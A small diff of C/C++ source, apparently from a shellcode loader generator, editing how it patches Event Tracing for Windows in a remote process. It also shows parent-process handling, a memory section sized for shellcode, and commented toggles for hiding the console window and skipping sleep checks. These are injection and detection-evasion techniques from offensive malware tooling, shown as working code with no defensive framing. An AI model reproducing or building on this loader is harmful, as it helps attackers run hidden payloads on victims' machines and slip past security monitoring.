@@ -766,7 +766,7 @@ void run() {
 
         NtClose(hParentProcess);
 
-        patchETWRemote(processInfo.hProcess); // Patch ETW Remote
+        //PATCHETWREMOTEREPLACEpatchETWRemote(processInfo.hProcess); // Patch ETW Remote
 
         SIZE_T size = shellcode_len;
         LARGE_INTEGER sectionSize = { size };
@@ -797,7 +797,6 @@ int main() {
         //LONGSLEEPREPLACEskipSleep();
         //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
         //PATCHETWREPLACEpatchETW();
-        //PATCHETWREMOTEREPLACEpatchETWRemote(target);
         run();
 
 }
